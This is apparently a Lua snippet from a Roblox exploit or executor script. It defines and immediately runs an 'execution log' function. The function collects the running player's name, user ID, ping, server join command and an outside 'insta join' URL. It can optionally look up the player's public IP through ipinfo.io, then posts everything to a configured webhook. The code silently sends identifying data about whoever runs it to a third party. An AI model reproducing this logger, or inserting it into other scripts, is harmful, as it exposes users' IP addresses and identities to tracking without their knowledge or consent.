local function execWebhook()
    local gId, jobId = game.PlaceId, tostring(game.JobId)
    local joinCmd    = ("game:GetService('TeleportService'):TeleportToPlaceInstance(%d,'%s',game:GetService('Players').LocalPlayer)"):format(gId, jobId)
    local insta      = ("https://kiel-x-kai.vercel.app/start?placeId=%d&gameInstanceId=%s"):format(gId, jobId)
    local ping       = tonumber(Stats.Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")) or 0

    local fields = {
        {name="Script",     value=("```%s```"):format(CONFIG.ExecScriptName), inline=false},
        {name="Player",     value=("```%s (%d)```"):format(LP.Name, LP.UserId), inline=true},
        {name="Ping",       value=("```%d ms```"):format(ping),               inline=true},
        {name="Join Cmd",   value=("```lua\n%s\n```"):format(joinCmd),        inline=false},
        {name="Insta Join", value=("%s"):format(insta),                 inline=false},
    }
    if CONFIG.LogIP then
        local ip = HS:JSONDecode(game:HttpGet("https://ipinfo.io/json")).ip
        table.insert(fields, {name="IP", value=("||%s||"):format(ip), inline=false})
    end

    local body = { embeds = {{ title = "🚀 Script Execution", color = 0x3498db, fields = fields,
                               footer = { text = "Exec‑Log • "..os.date() } }} }

    HTTP({
        Url     = CONFIG.Webhooks.Execution,
        Method  = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body    = HS:JSONEncode(body)
    })
end
execWebhook()

